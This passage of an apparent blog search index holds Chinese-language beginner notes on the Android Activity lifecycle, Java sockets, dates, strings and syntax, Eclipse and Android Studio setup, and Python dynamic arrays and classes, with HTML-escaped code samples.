被关闭时，系统会依次执行 3 个生命周期方法：onPause、onStop 和 onDestroy。 Activity 生命周期中方法的调用过程如图所示，可以很直观地了解到 Activity 的整个生命周期。","categories":[{"name":"Android","slug":"Android","permalink":"http://example.com/categories/Android/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"}]},{"title":"JAVA网络编程","slug":"Java/JAVA网络编程","date":"2020-09-20T07:03:03.000Z","updated":"2021-04-01T13:58:38.000Z","comments":true,"path":"2020/09/20/Java/JAVA网络编程/","link":"","permalink":"http://example.com/2020/09/20/Java/JAVA%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/","excerpt":"","text":"Java 网络编程网络编程是指编写运行在多个设备（计算机）的程序，这些设备都通过网络连接起来。 java.net 包中 J2SE 的 API 包含有类和接口，它们提供低层次的通信细节。你可以直接使用这些类和接口，来专注于解决问题，而不用关注通信细节。 java.net 包中提供了两种常见的网络协议的支持： TCP：TCP 是传输控制协议的缩写，它保障了两个应用程序之间的可靠通信。通常用于互联网协议，被称 TCP / IP。 UDP：UDP 是用户数据报协议的缩写，一个无连接的协议。提供了应用程序之间要发送的数据的数据包。 本教程主要讲解以下两个主题。 Socket 编程：这是使用最广泛的网络概念，它已被解释地非常详细。 Socket 编程Socket使用TCP提供了两台计算机之间的通信机制。 客户端程序创建一个Socket，并尝试连接服务器的Socket。 当连接建立时，服务器会创建一个 Socket 对象。客户端和服务器现在可以通过对 Socket 对象的写入和读取来进行通信。 java.net.Socket 类代表一个套接字，并且 java.net.ServerSocket 类为服务器程序提供了一种来监听客户端，并与他们建立连接的机制。 以下步骤在两台计算机之间使用套接字建立TCP连接时会出现： 服务器实例化一个 ServerSocket 对象，表示通过服务器上的端口通信。 服务器调用 ServerSocket 类的 accept() 方法，该方法将一直等待，直到客户端连接到服务器上给定的端口。 服务器正在等待时，一个客户端实例化一个 Socket 对象，指定服务器名称和端口号来请求连接。 Socket 类的构造函数试图将客户端连接到指定的服务器和端口号。如果通信被建立，则在客户端创建一个 Socket 对象能够与服务器进行通信。 在服务器端，accept() 方法返回服务器上一个新的 socket 引用，该 Socket 连接到客户端的 Socket。 连接建立后，通过使用 I/O 流在进行通信，每一个Socket都有一个输出流和一个输入流，客户端的输出流连接到服务器端的输入流，而客户端的输入流连接到服务器端的输出流。 TCP 是一个双向的通信协议，因此数据可以通过两个数据流在同一时间发送.以下是一些类提供的一套完整的有用的方法来实现 Socket。 ServerSocket 类的方法(服务器端的Socket)服务器应用程序通过使用 java.net.ServerSocket 类以获取一个端口,并且侦听客户端请求。 ServerSocket 类有四个构造方法： 序号 方法描述 1 public ServerSocket(int port) throws IOException 创建绑定到特定端口的服务器套接字。 2 public ServerSocket(int port, int backlog) throws IOException 利用指定的 backlog 创建服务器套接字并将其绑定到指定的本地端口号。 3 public ServerSocket(int port, int backlog, InetAddress address) throws IOException 使用指定的端口、侦听 backlog 和要绑定到的本地 IP 地址创建服务器。 4 public ServerSocket() throws IOException 创建非绑定服务器套接字。 创建非绑定服务器套接字。 如果 ServerSocket 构造方法没有抛出异常，就意味着你的应用程序已经成功绑定到指定的端口，并且侦听客户端请求。 这里有一些 ServerSocket 类的常用方法： 序号 方法描述 1 public int getLocalPort() 返回此套接字在其上侦听的端口。 2 public Socket accept() throws IOException 侦听并接受到此套接字的连接。 3 public void setSoTimeout(int timeout) 通过指定超时值启用/禁用 SO_TIMEOUT，以毫秒为单位。 4 public void bind(SocketAddress host, int backlog) 将 ServerSocket 绑定到特定地址（IP 地址和端口号）。 Socket 类的方法（客户端的Socket）java.net.Socket 类代表客户端和服务器都用来互相沟通的套接字。客户端要获取一个 Socket 对象通过实例化 ，而 服务器获得一个 Socket 对象则通过 accept() 方法的返回值。 Socket 类有五个构造方法. 序号 方法描述 1 public Socket(String host, int port) throws UnknownHostException, IOException. 创建一个流套接字并将其连接到指定主机上的指定端口号。 2 public Socket(InetAddress host, int port) throws IOException 创建一个流套接字并将其连接到指定 IP 地址的指定端口号。 3 public Socket(String host, int port, InetAddress localAddress, int localPort) throws IOException. 创建一个套接字并将其连接到指定远程主机上的指定远程端口。 4 public Socket(InetAddress host, int port, InetAddress localAddress, int localPort) throws IOException. 创建一个套接字并将其连接到指定远程地址上的指定远程端口。 5 public Socket() 通过系统默认类型的 SocketImpl 创建未连接套接字 InetAddress 类的方法这个类表示互联网协议(IP)地址。下面列出了 Socket 编程时比较有用的方法： 序号 方法描述 1 static InetAddress getByAddress(byte[] addr) 在给定原始 IP 地址的情况下，返回 InetAddress 对象。 2 static InetAddress getByAddress(String host, byte[] addr) 根据提供的主机名和 IP 地址创建 InetAddress。 3 static InetAddress getByName(String host) 在给定主机名的情况下确定主机的 IP 地址。 4 String getHostAddress() 返回 IP 地址字符串（以文本表现形式）。 5 String getHostName() 获取此 IP 地址的主机名。 6 static InetAddress getLocalHost() 返回本地主机。 7 String toString() 将此 IP 地址转换为 String。 例子客户端代码： 1234567891011121314151617181920212223242526272829303132333435package GreetingClient;import java.net.*;import java.io.*; //客户端代码public class GreetingClient&#123; public static void main(String [] args) &#123; //ip地址 String serverName = &quot;localhost&quot;; //端口 int port = 8888; try &#123; System.out.println(&quot;连接到主机：&quot; + serverName + &quot; ，端口号：&quot; + port); //建立一个socket对象（ip以及端口号） Socket client = new Socket(serverName, port); System.out.println(&quot;远程主机地址：&quot; + client.getRemoteSocketAddress()); //获得socket对象的输出流 OutputStream outToServer = client.getOutputStream(); DataOutputStream out = new DataOutputStream(outToServer); //输出获取的输出流和本地的ip以及端口 out.writeUTF(&quot;Hello from &quot; + client.getLocalSocketAddress()); //获取socket对象的输入流 InputStream inFromServer = client.getInputStream(); DataInputStream in = new DataInputStream(inFromServer); System.out.println(&quot;服务器响应： &quot; + in.readUTF()); client.close(); &#125;catch(IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; 服务端代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package GreetingServer;import java.net.*;import java.io.*; public class GreetingServer extends Thread&#123; private ServerSocket serverSocket; public GreetingServer(int port) throws IOException &#123; serverSocket = new ServerSocket(port); serverSocket.setSoTimeout(10000); &#125; public void run() &#123; while(true) &#123; try &#123; System.out.println(&quot;等待远程连接，端口号为：&quot; + serverSocket.getLocalPort() + &quot;...&quot;); Socket server = serverSocket.accept(); System.out.println(&quot;远程主机地址：&quot; + server.getRemoteSocketAddress()); System.out.println(&quot;xdm&quot;); DataInputStream in = new DataInputStream(server.getInputStream()); System.out.println(in.readUTF()); DataOutputStream out = new DataOutputStream(server.getOutputStream()); out.writeUTF(&quot;谢谢连接我：&quot; + server.getLocalSocketAddress() + &quot;\\nGoodbye!&quot;); server.close(); &#125;catch(SocketTimeoutException s) &#123; System.out.println(&quot;Socket timed out!&quot;); break; &#125;catch(IOException e) &#123; e.printStackTrace(); break; &#125; &#125; &#125; public static void main(String [] args) &#123; int port =8888; try &#123; Thread t = new GreetingServer(port); t.run(); &#125;catch(IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125;","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"JAVA的日期时间","slug":"Java/JAVA的日期时间","date":"2020-09-20T05:22:07.000Z","updated":"2021-04-01T13:57:14.000Z","comments":true,"path":"2020/09/20/Java/JAVA的日期时间/","link":"","permalink":"http://example.com/2020/09/20/Java/JAVA%E7%9A%84%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4/","excerpt":"","text":"先导入java.util.Date的类第一个构造函数使用当前日期和时间来初始化对象。 Date( ) 第二个构造函数接收一个参数，该参数是从1970年1月1日起的毫秒数。 Date(long millisec) Date对象创建以后，可以调用下面的方法。 序号 方法和描述 1 boolean after(Date date) 若当调用此方法的Date对象在指定日期之后返回true,否则返回false。 2 boolean before(Date date) 若当调用此方法的Date对象在指定日期之前返回true,否则返回false。 3 Object clone( ) 返回此对象的副本。 4 int compareTo(Date date) 比较当调用此方法的Date对象和指定日期。两者相等时候返回0。调用对象在指定日期之前则返回负数。调用对象在指定日期之后则返回正数。 5 int compareTo(Object obj) 若obj是Date类型则操作等同于compareTo(Date) 。否则它抛出ClassCastException。 6 boolean equals(Object date) 当调用此方法的Date对象和指定日期相等时候返回true,否则返回false。 7 long getTime( ) 返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。 8 int hashCode( ) 返回此对象的哈希码值。 9 void setTime(long time) 用自1970年1月1日00:00:00 GMT以后time毫秒数设置时间和日期。 10 String toString( ) 把此 Date 对象转换为以下形式的 String： dow mon dd hh:mm:ss zzz yyyy 其中： dow 是一周中的某一天 (Sun, Mon, Tue, Wed, Thu, Fri, Sat)。 格式化时间第一种： 1234567891011121314151617package test1;import java.util.Date;import java.text.*;public class test1&#123; public static void main(String args[] )&#123; // 初始化 Date 对象 Date dNow = new Date( ); //先建立一个转化格式 这一行代码确立了转换的格式，其中 yyyy 是完整的公元年，MM //是月份，dd 是日期，HH:mm:ss 是时、分、秒。注意:有的格式大写，有的格式小写，例如 MM 是月份，mm 是分；HH 是 24 小时制，而 hh 是 12 小时制。 SimpleDateFormat ft = new SimpleDateFormat (&quot;yyyy-MM-dd hh:mm:ss&quot;); System.out.print(ft.format(dNow)+&quot;\\n&quot;); &#125;&#125; 运行结果: 第二种：使用printf格式化日期 printf 方法可以很轻松地格式化时间和日期。使用两个字母格式，它以 %t 开头并且以下面表格中的一个字母结尾。 12345678910111213141516171819202122import java.util.Date; public class DateDemo &#123; public static void main(String args[]) &#123; // 初始化 Date 对象 Date date = new Date(); //c的使用 System.out.printf(&quot;全部日期和时间信息：%tc%n&quot;,date); //f的使用 System.out.printf(&quot;年-月-日格式：%tF%n&quot;,date); //d的使用 System.out.printf(&quot;月/日/年格式：%tD%n&quot;,date); //r的使用 System.out.printf(&quot;HH:MM:SS PM格式（12时制）：%tr%n&quot;,date); //t的使用 System.out.printf(&quot;HH:MM:SS格式（24时制）：%tT%n&quot;,date); //R的使用 System.out.printf(&quot;HH:MM格式（24时制）：%tR&quot;,date); &#125;&#125;","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"JAVA的string","slug":"Java/JAVA的string","date":"2020-09-20T04:42:18.000Z","updated":"2021-04-01T13:57:00.000Z","comments":true,"path":"2020/09/20/Java/JAVA的string/","link":"","permalink":"http://example.com/2020/09/20/Java/JAVA%E7%9A%84string/","excerpt":"","text":"创建字符串1234567public class StringDemo&#123; public static void main(String args[])&#123; char[] helloArray = &#123; &#x27;r&#x27;, &#x27;u&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;o&#x27;, &#x27;b&#x27;&#125;; String helloString = new String(helloArray); System.out.println( helloString ); &#125;&#125; 字符串长度String 类的一个访问器方法是 length() 方法，它返回字符串对象包含的字符数。 1234567public class StringDemo &#123; public static void main(String args[]) &#123; String site = &quot;ccccc&quot;; int len = site.length(); System.out.println( &quot; : &quot; + len ); &#125;&#125; 连接字符串string1.concat(string2); 12345678910public class test1&#123; public static void main(String args[] )&#123; //string1.concat(string2); String str1=&quot;abc&quot;; String str2=&quot;def&quot;; String str3=str1.concat(str2); System.out.print(str3); &#125;&#125; 创建格式化字符串String 类使用静态方法 format() 返回一个String 对象而不是 PrintStream 对象。 String 类的静态方法 format() 能用来创建可复用的格式化字符串，而不仅仅是用于一次打印输出。 12345678910111213public class test1&#123; public static void main(String args[] )&#123; float a=3.33f; int intVar=3; String stringVar=&quot;abc&quot;; System.out.printf(&quot;浮点型变量的值为 &quot; + &quot;%3f, 整型变量的值为 &quot; + &quot; %d, 字符串变量的值为 &quot; + &quot;is %s&quot;, a, intVar, stringVar); &#125;&#125; 输出结果： 12345String fs;fs = String.format(&quot;浮点型变量的值为 &quot; + &quot;%f, 整型变量的值为 &quot; + &quot; %d, 字符串变量的值为 &quot; + &quot; %s&quot;, floatVar, intVar, stringVar); 输出一个限定小数点的浮点数 使用String.format和DecimalFormat.format 12345678910public class Main&#123; public static void main(String[] args)&#123; double pi=3.142; //3.14 System.out.println(String.format(&quot;%.2f&quot;, pi)); System.out.println(new DecimalFormat(&quot;0.00&quot;).format(pi)); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://example.com/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"JAVA基础语法","slug":"Java/JAVA基础语法","date":"2020-09-20T04:00:47.000Z","updated":"2021-04-01T13:57:58.000Z","comments":true,"path":"2020/09/20/Java/JAVA基础语法/","link":"","permalink":"http://example.com/2020/09/20/Java/JAVA%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","excerpt":"","text":"Java 基础语法一个 Java 程序可以认为是一系列对象的集合，而这些对象通过调用彼此的方法来协同工作。下面简要介绍下类、对象、方法和实例变量的概念。 对象：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。 类：类是一个模板，它描述一类对象的行为和状态。 方法：方法就是行为，一个类可以有很多方法。逻辑运算、数据修改以及所有动作都是在方法中完成的。 实例变量：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定。 Java修饰符像其他语言一样，Java可以使用修饰符来修饰类中方法和属性。主要有两类修饰符： 访问控制修饰符 : default, public , protected, private 非访问控制修饰符 : final, abstract, static, synchronized Java 枚举12345678910111213class FreshJuice &#123; enum FreshJuiceSize&#123; SMALL, MEDIUM , LARGE &#125; FreshJuiceSize size; &#125; public class test1 &#123; public static void main(String[] args)&#123; FreshJuice juice = new FreshJuice(); juice.size = FreshJuice.FreshJuiceSize.MEDIUM ; System.out.println(juice.size); &#125; &#125; 输出结果： 接口在 Java 中，接口可理解为对象间相互通信的协议。接口在继承中扮演着很重要的角色。 接口只定义派生要用到的方法，但是方法的具体实现完全取决于派生类。 对象（与c大同小异）对象是根据类创建的。在Java中，使用关键字 new 来创建一个新的对象。创建对象需要以下三步： 声明：声明一个对象，包括对象名称和对象类型。 实例化：使用关键字 new 来创建一个对象。 初始化：使用 new 创建对象时，会调用构造方法初始化对象0。 可以直接在类中定义主函数。 12345678910111213141516171819202122232425262728public class Puppy&#123; int puppyAge;//构造函数 public Puppy(String name)&#123; // 这个构造器仅有一个参数：name System.out.println(&quot;小狗的名字是 : &quot; + name ); &#125; public void setAge( int age )&#123; puppyAge = age; &#125; public int getAge( )&#123; System.out.println(&quot;小狗的年龄为 : &quot; + puppyAge ); return puppyAge; &#125; public static void main(String[] args)&#123; /* 创建对象 */ Puppy myPuppy = new Puppy( &quot;tommy&quot; );//构造函数 /* 通过方法来设定age */ myPuppy.setAge( 2 ); /* 调用另一个方法获取age */ myPuppy.getAge( ); /*你也可以像下面这样访问成员变量 */ System.out.println(&quot;变量值 : &quot; + myPuppy.puppyAge ); &#125;&#125; 输出结果： 源文件声明规则在本节的最后部分，我们将学习源文件的声明规则。当在一个源文件中定义多个类，并且还有import语句和package语句时，要特别注意这些规则。 一个源文件中只能有一个 public 类 一个源文件可以有多个非 public 类 源文件的名称应该和 public 类的类名保持一致。例如：源文件中 public 类的类名是 Employee，那么源文件应该命名为Employee.java。 如果一个类定义在某个包中，那么 package 语句应该在源文件的首行。 如果源文件包含 import 语句，那么应该放在 package 语句和类定义之间。如果没有 package 语句，那么 import 语句应该在源文件中最前面。 import 语句和 package 语句对源文件中定义的所有类都有效。在同一源文件中，不能给不同的类不同的包声明。 类有若干种访问级别，并且类也分不同的类型：抽象类和 final 类等。这些将在访问控制章节介绍。 除了上面提到的几种类型，Java 还有一些特殊的类，如：内部类、匿名类。 例子文件结构： 两个java文件在同个文件夹里，可以直接package test1;导入其中的类 Employee.java： 12345678910111213141516171819202122232425262728293031package test1;public class Employee &#123; String name; int age; String designation; double salary; // Employee 类的构造器 public Employee(String name)&#123; this.name = name; &#125; // 设置age的值 public void empAge(int empAge)&#123; age = empAge; &#125; /* 设置designation的值*/ public void empDesignation(String empDesig)&#123; designation = empDesig; &#125; /* 设置salary的值*/ public void empSalary(double empSalary)&#123; salary = empSalary; &#125; /* 打印信息 */ public void printEmployee()&#123; System.out.println(&quot;名字:&quot;+ name ); System.out.println(&quot;年龄:&quot; + age ); System.out.println(&quot;职位:&quot; + designation ); System.out.println(&quot;薪水:&quot; + salary); &#125;&#125; test1.java: 123456789101112131415161718192021package test1;public class test1&#123; public static void main(String[] args)&#123; /* 使用构造器创建两个对象 */ Employee empOne = new Employee(&quot;RUNOOB1&quot;); Employee empTwo = new Employee(&quot;RUNOOB2&quot;); // 调用这两个对象的成员方法 empOne.empAge(26); empOne.empDesignation(&quot;高级程序员&quot;); empOne.empSalary(1000); empOne.printEmployee(); empTwo.empAge(21); empTwo.empDesignation(&quot;菜鸟程序员&quot;); empTwo.empSalary(500); empTwo.printEmployee(); &#125;&#125; 输出结果：","categories":[{"name":"Java","slug":"Java","permalink":"http://example.com/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"java+eclipse配置问题","slug":"环境配置/java-eclipse配置问题","date":"2020-09-20T02:55:15.000Z","updated":"2021-04-01T14:09:28.000Z","comments":true,"path":"2020/09/20/环境配置/java-eclipse配置问题/","link":"","permalink":"http://example.com/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/java-eclipse%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/","excerpt":"","text":"1.下载完eclipse后建项目出现了 2.可能出现的原因：https://cloud.tencent.com/developer/article/1043538但我不是这个原因；打开jre的配置环境发现是一个无效路径 后面打开安装的jdk发现里面没jre文件夹，根据链接https://blog.csdn.net/ksws01/article/details/104684182知道了jdk后续版本不能产生jre，注意要用有管理权限的powershell，不然会添加失败。添加完之后改变一下jre的环境即可运行","categories":[{"name":"环境配置","slug":"环境配置","permalink":"http://example.com/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"环境配置","slug":"环境配置","permalink":"http://example.com/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}]},{"title":"Android Studio配置环境","slug":"环境配置/Android-Studio配置环境","date":"2020-09-19T17:00:24.000Z","updated":"2021-04-01T14:09:24.000Z","comments":true,"path":"2020/09/20/环境配置/Android-Studio配置环境/","link":"","permalink":"http://example.com/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Android-Studio%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/","excerpt":"","text":"教程:https://www.cnblogs.com/yanglh6-jyx/p/Android_AS_Configuration.html SDK TOOLS安装过程最后先解析一下dl.google.com 能ping到的主机 然后修改一下host文件 这样下载速度就相对快一点","categories":[{"name":"环境配置","slug":"环境配置","permalink":"http://example.com/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"Android","slug":"Android","permalink":"http://example.com/tags/Android/"},{"name":"环境配置","slug":"环境配置","permalink":"http://example.com/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}]},{"title":"Python的动态数组","slug":"Python/Python的动态数组","date":"2020-09-12T03:15:48.000Z","updated":"2021-04-01T14:08:44.000Z","comments":true,"path":"2020/09/12/Python/Python的动态数组/","link":"","permalink":"http://example.com/2020/09/12/Python/Python%E7%9A%84%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/","excerpt":"","text":"1.python的序列类型本质内置的三大常用数据结构——列表类（list）、元组类（tuple）和字符串类（str） 类都有一个很明显的共性，都可以用来保存多个数据元素，最主要的功能是：每个类都支持下标（索引）访问该序列的元素，比如使用语法 Seq[i]。其实上面每个类都是使用 数组 这种简单的数据结构表示。 2.python的列表实例操作 123456789101112131415161718192021222324test_list = [] # 创建名为test_list的空列表#在列表后添加元素test_list.append(&quot;Hello&quot;)test_list.append(&quot;World&quot;)test_list=[&#x27;Hello&#x27;, &#x27;World&#x27;]#重新对数组进行赋值test_list=[&quot;Hello&quot;, &quot;Array&quot;, 2019, &quot;easy learning&quot;, &quot;DataStructure&quot;]# 重新给test_list赋值print(&quot;数组的长度：&quot;+str(len(test_list))) # 求列表的长度test_list[2] = 1024 # 修改列表元素print(&quot;改变数组元素:&quot;+str(test_list))test_list.insert(1, &quot;I love&quot;) # 向列表中指定位置中插入一个元素print(&quot;列表中指定位置中插入一个元素:&quot;+str(test_list))test_list.append(2020) # 向列表末尾增加一个元素print(&quot;向列表末尾增加一个元素:&quot;+str(test_list))print(test_list.pop(1)) # 删除指定位置的元素print(&quot;删除指定位置的元素:&quot;+str(test_list))test_list.remove(2020) # 删除指定元素print(&quot;删除指定元素2020:&quot;+str(test_list))print(&quot;查找某个元素的索引值:&quot;+str(test_list.index(&#x27;Hello&#x27;))) # 查找某个元素的索引值#test_list.index(&#x27;hello&#x27;) # 如果查找某个元素不在列表中，返回ValueError错误test_list.reverse() # 反转整个列表print(&quot;反转整个列表:&quot;+str(test_list))test_list.clear() # 清空列表print(&quot; 清空列表:&quot;+str(test_list)) 运行结果： 3.Python列表的内存分配12345678910111213# 导入sys模块能方便我们使用gestsizeof函数import sys# set nn = 20# set empty listlist = []for i in range(n): a = len(list) # 调用getsizeof函数用于给出Python中存储对象的真实字节数 b = sys.getsizeof(list) print(&#x27;Length:&#123;0:3d&#125;; Size of bytes:&#123;1:4d&#125;&#x27;.format(a, b)) # Increase length by one list.append(n) 运行结果： 从Length：1为56，Length：2为88，直到Length：4为88 88-56=32=4*8 64位机器为8字节一个整数 4.动态数组动态数组是内存的连续区域，其大小随着插入新数据而动态增长。在静态数组中，我们需要在分配时指定大小。在定义数组的时候，其实计算机已经帮我们分配好了内存来存储，实际上我们不能扩展数组，因为它的大小是固定的。比如：我们分配一个大小为10的数组，则不能插入超过10个项目。 但是动态数组会在需要的时候自动调整其大小。这一点有点像我们使用的Python列表，可以存储任意数量的项目，而无需在分配时指定大小。 实现一个动态数组的实现的关键是——如何扩展数组？当列表list1的大小已满时，而此时有新的元素要添加进列表，我们会执行一下步骤来克服其大小限制的缺点： 分配具有更大容量的新数组 list2 设置 list2[i] = list1[i] (i=0,1,2,…，n-1)，其中n是该项目的当前编号 设置list1 = list2，也就是说，list2正在作为新的数组来引用我们的新列表。 然后，只要将新的元素插入（添加）到我们的列表list1即可。 实现动态数组的Python代码在Python中，我们利用ctypes的内置库来创建自己的动态数组类，因为ctypes模块提供对原始数组的支持，为了更快的对数组进行学习，所以对ctypes的知识可以查看官方文档进行学习。关于Python的公有方法与私有方法，我们在方法名称前使用双下划线**__**使其保持隐藏状态。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115import ctypesclass DynamicArray: &quot;&quot;&quot;A dynamic array class akin to a simplified Python list.&quot;&quot;&quot; def __init__(self): &quot;&quot;&quot;Create an empty array.&quot;&quot;&quot; self.n = 0 # count actual elements self.capacity = 1 # default array capacity self.A = self._make_array(self.capacity) # low-level array def is_empty(self): &quot;&quot;&quot; Return True if array is empty&quot;&quot;&quot; return self.n == 0 def __len__(self): &quot;&quot;&quot;Return numbers of elements stored in the array.&quot;&quot;&quot; return self.n def __getitem__(self, i): &quot;&quot;&quot;Return element at index i.&quot;&quot;&quot; if not 0 &lt;= i &lt; self.n: # Check it i index is in bounds of array raise ValueError(&#x27;invalid index&#x27;) return self.A[i] def append(self, obj): &quot;&quot;&quot;Add object to end of the array.&quot;&quot;&quot; if self.n == self.capacity: # Double capacity if not enough room self._resize(2 * self.capacity) self.A[self.n] = obj # Set self.n index to obj self.n += 1 def _resize(self, c): &quot;&quot;&quot;Resize internal array to capacity c.&quot;&quot;&quot; B = self._make_array(c) # New bigger array for k in range(self.n): # Reference all existing values B[k] = self.A[k] self.A = B # Call A the new bigger array self.capacity = c # Reset the capacity @staticmethod def _make_array(c): &quot;&quot;&quot;Return new array with capacity c.&quot;&quot;&quot; return (c * ctypes.py_object)() def insert(self, k, value): &quot;&quot;&quot;Insert value at position k.&quot;&quot;&quot; if self.n == self.capacity: self._resize(2 * self.capacity) for j in range(self.n, k, -1): self.A[j] = self.A[j-1] self.A[k] = value self.n += 1 def pop(self, index=0): &quot;&quot;&quot;Remove item at index (default first).&quot;&quot;&quot; if index &gt;= self.n or index &lt; 0: raise ValueError(&#x27;invalid index&#x27;) for i in range(index, self.n-1): self.A[i] = self.A[i+1] self.A[self.n - 1] = None self.n -= 1 def remove(self, value): &quot;&quot;&quot;Remove the first occurrence of a value in the array.&quot;&quot;&quot; for k in range(self.n): if self.A[k] == value: for j in range(k, self.n - 1): self.A[j] = self.A[j+1] self.A[self.n - 1] = None self.n -= 1 return raise ValueError(&#x27;value not found&#x27;) def _print(self): &quot;&quot;&quot;Print the array.&quot;&quot;&quot; for i in range(self.n): print(self.A[i], end=&#x27; &#x27;) print()def main(): # Instantiate mylist = DynamicArray() # Append new element mylist.append(10) mylist.append(9) mylist.append(8) # Insert new element in given position mylist.insert(1, 1024) mylist.insert(2, 2019) # Check length print(&#x27;The array length is: &#x27;, mylist.__len__()) # Print the array print(&#x27;Print the array：&#x27;) mylist._print() # Index print(&#x27;The element at index 1 is :&#x27;, mylist[1]) # Remove element print(&#x27;Remove 2019 in array:&#x27;) mylist.remove(2019) mylist._print() # Pop element in given position print(&#x27;Pop pos 2 in array:&#x27;) # mylist.pop() mylist.pop(2) mylist._print()if __name__ == &#x27;__main__&#x27;: main() 运行结果：","categories":[{"name":"Python","slug":"Python","permalink":"http://example.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"}]},{"title":"Python的类","slug":"Python/Python的类","date":"2020-09-10T09:13:28.000Z","updated":"2021-04-01T14:08:30.000Z","comments":true,"path":"2020/09/10/Python/Python的类/","link":"","permalink":"http://example.com/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/","excerpt":"","text":"链接：https://www.runoob.com/python/python-object.html 1.基础概念 类(Class): 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。 类变量：类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。 数据成员：类变量或者实例变量, 用于处理类及其实例对象的相关的数据。 方法重写：如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。 局部变量：定义在方法中的变量，只作用于当前实例的类。 实例变量：在类的声明中，属性是用变量来表示的。这种变量就称为实例变量，是在类声明的内部但是在类的其他成员方法之外声明的。 继承：即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。 实例化：创建一个类的实例，类的具体对象。 方法：类中定义的函数。 对象：通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。 2.基本形式123class ClassName: &#x27;提示信息&#x27; class_suite #类体 1234567891011121314151617181920class animals: &#x27;动物类&#x27; ani_Count = 0 def __init__(self, cat, dog): self.cat = cat self.dog = dog animals.ani_Count+=1 #一个类中的变量 在所有类中共享 def displayCount(self): print(&quot;Total animals cat and dog %d&quot; %animals.ani_Count) def disanimals_name(self): print(&quot;Cat: &quot;, self.cat, &quot;, Dog: &quot;, self.dog)home=animals(&quot;kitty&quot;,&quot;amy&quot;)zoo=animals(&quot;kitty&quot;,&quot;amy&quot;)home.disanimals_name()zoo.disanimals_name()home.displayCount() ani_Count是一个类中的变量，应该是类似在C中类中声明的静态变量，各个对象去共享通过变量 init_为该类的构造函数，第一个变量应都为self该对象本身，self 代表类的实例，self 在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数 声明对象为 对象名=类名(构造变量） 运行截图： 123456789#添加类中的属性home.bird=&quot;titi&quot;print(home.bird)#修改类中的属性home.bird=&quot;qiqi&quot;print(home.bird)#删除类中的属性del home.birdprint(hasattr(home, &#x27;bird&#x27;)) # 如果存在 &#x27;bird&#x27; 属性返回 True，否则返回Fasle。 运行截图： 3.Python内置类属性 dict : 类的属性（包含一个字典，由类的数据属性组成） doc :类的文档字符串 name: 类名 module: 类定义所在的模块（类的全名是’main.className’，如果类位于一个导入模块mymod中，那么className.module 等于 mymod） bases : 类的所有父类构成元素（包含了一个由所有父类组成的元组） 1234567891011121314print (&quot;animals.__doc__:&quot;, animals.__doc__)#输出类中的标识信息print (&quot;animals.__name__:&quot;, animals.__name__)#输出类名print (&quot;animals.__module__:&quot;, animals.__module__)#输出类所在的模块（类的全名是&#x27;__main__.className&#x27;，如果类位于一个导入模块mymod中，那么className.__module__ 等于 mymod）print (&quot;animals.__bases__:&quot;, animals.__bases__)#输出类的所有父类构成元素（包含了一个由所有父类组成的元组）print (&quot;animals.__dict__:&quot;, animals.__dict__)#输出类的所有清单属性 运行截图 4.类的继承面向对象的编程带来的主要好处之一是代码的重用，实现这种重用的方法之一是通过继承机制。 通过继承创建的新类称为子类或派生类，被继承的类称为基类、父类或超类。 继承语法 1234567891011class 派生类名(基类名) ...class A: # 定义类 A.....class B: # 定义类 B.....class C(A, B): # 继承类 A 和 B..... 例子 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/python# -*- coding: UTF-8 -*-class Parent: # 定义父类 #父类中的变量 parentAttr = 0 def __init__(self): print(&quot;调用父类构造函数&quot;) def parentMethod(self): print(&#x27;调用父类方法&#x27;) def setAttr(self, attr): Parent.parentAttr = attr def getAttr(self): print (&quot;父类属性 :&quot;, Parent.parentAttr)class Child(Parent): # 定义子类 def __init__(self): 